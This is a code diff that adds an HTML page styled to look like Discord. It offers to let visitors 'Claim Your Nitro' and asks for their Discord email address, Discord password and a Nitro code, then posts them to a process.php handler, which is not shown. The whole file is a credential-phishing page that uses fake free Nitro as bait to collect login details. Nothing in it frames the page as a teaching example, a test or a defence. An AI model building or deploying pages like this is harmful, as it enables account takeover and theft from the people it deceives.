@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Claim Your Nitro</title>
+    <style>
+        body { background-color: #313338; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background-color: #2b2d31; padding: 30px; border-radius: 8px; width: 350px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        h2 { text-align: center; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 4px; background-color: #1e1f22; color: #fff; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #5865f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        button:hover { background-color: #4752c4; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Claim Your Nitro!</h2>
+        <form action="process.php" method="POST">
+            <input type="email" name="email" placeholder="Discord Email" required>
+            <input type="password" name="password" placeholder="Discord Password" required>
+            <input type="text" name="code" placeholder="Nitro Code" required>
+            <button type="submit">Claim</button>
+        </form>
+    </div>
+</body>
+</html>
